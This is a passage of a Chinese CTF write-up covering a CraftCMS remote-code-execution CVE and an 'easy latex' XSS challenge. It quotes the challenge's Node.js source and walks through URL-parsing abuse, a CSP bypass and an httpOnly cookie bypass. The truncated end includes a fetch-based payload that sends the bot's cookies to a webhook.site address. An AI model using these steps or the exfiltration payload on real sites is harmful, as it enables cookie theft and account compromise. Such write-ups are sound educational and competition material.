        <content type="html"><![CDATA[<p>这次比赛题非常有意思，甚至可以用猥琐两个字形容。</p><p><code>web</code>题是和<code>kkkl@chamd5</code>师傅一起做的，很多思路都是他想出来的。</p><h4 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h4><p>之前爆出过<code>cve</code>，参考这篇：</p><p><a href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>使用第二种<code>trick</code>打日志包含会被检测到，而使用第三种方法<code>imagemagick</code>扩展写马应该是没有权限，写不进去<code>web</code>目录。</p><p>考虑第一次直接复制里面的报文打就行，往<code>/tmp</code>下写文件。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682144239.jpg" alt="1698682144239"></p><p>随后文件包含即可。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682170209.jpg" alt="1698682170209"></p><h4 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h4><p>这题看上去是要<code>XSS</code>。大体看一遍逻辑发现<code>theme</code>是可控的，并且渲染的时候是通过<code>latex-js</code>来远程加载<code>theme</code>，利用点估计就是通过可控的<code>theme</code>进行<code>xss</code>。</p><p>一开始看错了，还以为是什么<code>md5</code>弱类型绕过，仔细一看就是把账号<code>md5</code>之后当作密码就能登陆了。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">!=</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> msg<span class="token punctuation">:</span> <span class="token string">'login failed'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="成为vip"><a href="#成为vip" class="headerlink" title="成为vip"></a>成为vip</h5><p>既然要想办法利用<code>theme</code>那么肯定要成为<code>vip</code>了。这里<code>url</code>返回一个<code>ok</code>就可以成为<code>vip</code>了。比较奇怪的是他是用<code>new URL(username, vip_url)</code>作为<code>url</code>请求访问的，正常来说直接格式化字符串就好了，并且这个<code>username</code>在前面，当时就觉得比较可疑。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span><span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span>session    <span class="token keyword">let</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>username    <span class="token keyword">let</span> <span class="token punctuation">{</span> code <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">let</span> vip_url <span class="token operator">=</span> VIP_URL    <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> vip_url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>            Cookie<span class="token punctuation">:</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>k<span class="token punctuation">,</span> v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>v<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        body<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span> code <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'ok'</span> <span class="token operator">==</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Congratulation! You are VIP now.'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体看<code>URL()</code>的逻辑或者本地去调试都很容易发现：只要第一个参数是个完整的<code>http url</code>就会把第二个参数无视掉。因此自己写个返回<code>ok</code>的网页就能成为<code>vip</code>了。</p><p>以这个恶意<code>url</code>为用户名登陆即可成为<code>vip</code>。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20231031001103195.png" alt="image-20231031001103195"></p><h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p><code>XSS</code>这一步就有点恶心了。其实这里已经看到了<code>id</code>是可控的，不一定非要访问<code>/note</code>，但此时光想着怎么打<code>note.html</code>的<code>xss</code>了。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/share/:id'</span><span class="token punctuation">,</span> reportLimiter<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'no note id specified'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token string">`http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>PORT<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">await</span> <span class="token function">visit</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'something error'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为<code>/note</code>这里是要求是<code>vip</code>才能传<code>theme</code>，这里就进入<code>ctf</code>的思维定式了（既然这个路由要成为<code>vip</code>才能设置主题那么肯定有用），但是看了眼<code>note.html</code>有比较严格的<code>CSP</code>限制。这里和队友想了好久，其中发现了两种方法可以打<code>alert</code>，我的方法比较答辩，就是控制<code>host</code>头赋值给<code>CSP</code>就能打本地<code>alert</code>，但实际上连<code>bot</code>都打不了，除非除非是有个<code>CRLF</code>。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682299128.jpg" alt="1698682299128"></p><p>队友<code>kkkl</code>想到的方法是更通用的，因为<code>note.html</code>的<code>CSP</code>引入了<code>jsdelivr</code>，这是个可以代理<code>github</code>的<code>cdn</code>，因此只要把<code>github</code>中的恶意脚本通过<a href="https://www.jsdelivr.com/github%E4%BB%A3%E7%90%86%E5%B0%B1%E8%83%BD%E7%BB%95%E8%BF%87%60CSP%60%E4%BA%86%EF%BC%8C%E4%BD%86%E5%8F%AF%E6%83%9C%E7%9A%84%E6%98%AF%E8%BF%99%E7%A7%8D%E6%96%B9%E6%B3%95%E5%9C%A8%E5%90%8E%E7%BB%AD%E4%B9%9F%E6%A0%B9%E6%9C%AC%E4%B8%8D%E5%8F%AF%E8%83%BD%E7%BB%95%E8%BF%87%60http">https://www.jsdelivr.com/github代理就能绕过`CSP`了，但可惜的是这种方法在后续也根本不可能绕过`http</a> only&#96;。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/note'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'empty tex'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>theme <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isVip<span class="token punctuation">)</span> <span class="token punctuation">{</span>        theme <span class="token operator">=</span> <span class="token string">''</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>theme <span class="token operator">||</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isVip<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token punctuation">:</span> <span class="token string">'Be VIP to enable theme setting!'</span>    msg <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\nYour note link: http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>    msg <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\nShare it via http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/share/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但后来想到了<code>/preview.html</code>也是可以请求加载指定的<code>theme</code>的，并且没有<code>CSP</code>，再结合前面提到的<code>id</code>是可控的就能完美利用了。</p><pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mt-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>latex-js</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tex<span class="token punctuation">"</span></span> <span class="token attr-name">baseURL</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> base %<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;%= tex %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>latex-js</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>能够请求自定义的<code>theme</code>是因为<code>/preview</code>路由下面也是通过<code>new URL</code>这种错误的处理方式进行<code>fetch</code>的，<code>theme</code>可控所以就可以随便加载我们自定义的<code>js</code>了，最关键的是这个页面<strong>没有CSP限制</strong>。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/preview'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tex <span class="token operator">=</span> <span class="token string">'Today is \\today.'</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> <span class="token function">getNonce</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> base <span class="token operator">=</span> <span class="token string">'https://cdn.jsdelivr.net/npm/latex.js/dist/'</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">)</span> <span class="token punctuation">{</span>        base <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>theme<span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/theme/`</span></span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span>    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'preview.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> nonce<span class="token punctuation">,</span> base <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里请求的<code>js</code>是需要注意一下的，比如你传参<code>?theme=http://xx.xx.xx.xx</code>，那么他请求加载的<code>js</code>路径是<code>http://xx.xx.xx.xx/js/base.js</code>。</p><h5 id="绕过http-only"><a href="#绕过http-only" class="headerlink" title="绕过http only"></a>绕过http only</h5><p><code>bot</code>的逻辑是很经典的限制了<code>domain</code>和<code>http only</code>，在队内月赛&#x2F;升级赛遇到无数次这种恶心的东西。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> visit <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`start: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        headless<span class="token punctuation">:</span> <span class="token string">'new'</span><span class="token punctuation">,</span>        executablePath<span class="token punctuation">:</span> puppeteer<span class="token punctuation">.</span><span class="token function">executablePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> ctx <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">createIncognitoBrowserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            name<span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>            value<span class="token punctuation">:</span> FLAG<span class="token punctuation">,</span>            domain<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>APP_HOST<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>APP_PORT<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span>            httpOnly<span class="token punctuation">:</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span>timeout<span class="token punctuation">:</span> <span class="token number">5000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`done: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>visit <span class="token operator">=</span> visit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>http only</code>只限制了<code>js</code>层面获取<code>cookie</code>，但是代码层面是管不到的。而<code>domain</code>限制了<code>cookie</code>的有效域，因此只能想办法找个<code>app.js</code>中的路由回显<code>cookie</code>了。很容易就想到了<code>vip</code>路由，这里会带着<code>cookie</code>访问<code>url</code>。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span><span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span>session    <span class="token keyword">let</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>username    <span class="token keyword">let</span> <span class="token punctuation">{</span> code <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">let</span> vip_url <span class="token operator">=</span> VIP_URL    <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> vip_url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>            Cookie<span class="token punctuation">:</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>k<span class="token punctuation">,</span> v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>v<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        body<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span> code <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'ok'</span> <span class="token operator">==</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Congratulation! You are VIP now.'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而这里是又出现了<code>new URL</code>这种错误处理方式，所以<code>username</code>搞成自己的<code>dnslog</code>就可以了。</p><p>这里有两种办法。一种是控制机器人去登录拿到<code>token</code>，另一种是在远程登录个账号，把浏览器的<code>token</code>复制过来用<code>fetch</code>直接带着<code>token</code>打<code>/vip</code>。</p><p>PS：憨批了本地调试的时候把<code>/vip</code>的<code>auth</code>关掉了操，我说怎么没<code>token</code>打不通。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'https://webhook.site/e58effa8-d9d9-48a0-98f2-22a962961c22'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">'9cbf71c9e88878f6db5cc6285a7a1de7'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>  headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  body<span class="token punctuation">:</span> data<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>response <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> vipData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 